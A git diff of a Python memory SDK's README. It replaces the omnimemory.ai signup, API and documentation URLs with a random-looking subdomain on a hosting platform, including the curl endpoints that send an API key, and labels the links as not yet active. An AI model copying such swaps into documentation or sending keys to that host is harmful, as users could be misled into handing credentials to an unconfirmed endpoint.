@@ -55,7 +55,7 @@ if result:
 pip install omem
 ```
 
-**Requirements:** Python 3.8+, API key from [https://www.omnimemory.ai](https://www.omnimemory.ai/#pricing)
+**Requirements:** Python 3.8+, API key from [https://zdfdulpnyaci.sealoshzh.site](https://zdfdulpnyaci.sealoshzh.site/#pricing)
 
 ---
 
@@ -290,7 +290,7 @@ e.entity_id    # str - related entity
 Save a conversation.
 
 ```bash
-curl -X POST "https://api.omnimemory.ai/api/v1/memory/ingest" \
+curl -X POST "https://zdfdulpnyaci.sealoshzh.site/api/v1/memory/ingest" \
   -H "Content-Type: application/json" \
   -H "x-api-key: qbk_xxx" \
   -d '{
@@ -307,7 +307,7 @@ curl -X POST "https://api.omnimemory.ai/api/v1/memory/ingest" \
 Search memories.
 
 ```bash
-curl -X POST "https://api.omnimemory.ai/api/v1/memory/retrieval" \
+curl -X POST "https://zdfdulpnyaci.sealoshzh.site/api/v1/memory/retrieval" \
   -H "Content-Type: application/json" \
   -H "x-api-key: qbk_xxx" \
   -d '{
@@ -375,9 +375,9 @@ result = mem.search("query")  # Works!
 
 ---
 
-## Links
+## up coming Links (not activate yet)
 
-- **SDK Docs**: [https://www.omnimemory.ai/docs/sdk/python](https://www.omnimemory.ai/docs/sdk/python)
-- **API Reference**: [https://www.omnimemory.ai/docs/api/memory](https://www.omnimemory.ai/docs/api/memory)
-- **Pipelines**: [https://www.omnimemory.ai/docs/pipelines](https://www.omnimemory.ai/docs/pipelines)
-- **Get API Key**: [https://www.omnimemory.ai](https://www.omnimemory.ai/#pricing)
+- **SDK Docs**: [https://zdfdulpnyaci.sealoshzh.site/docs/sdk/python](https://zdfdulpnyaci.sealoshzh.site/docs/sdk/python)
+- **API Reference**: [https://zdfdulpnyaci.sealoshzh.site/docs/api/memory](https://zdfdulpnyaci.sealoshzh.site/docs/api/memory)
+- **Pipelines**: [https://zdfdulpnyaci.sealoshzh.site/docs/pipelines](https://zdfdulpnyaci.sealoshzh.site/docs/pipelines)
+- **Get API Key**: [https://zdfdulpnyaci.sealoshzh.site](https://zdfdulpnyaci.sealoshzh.site/#pricing)
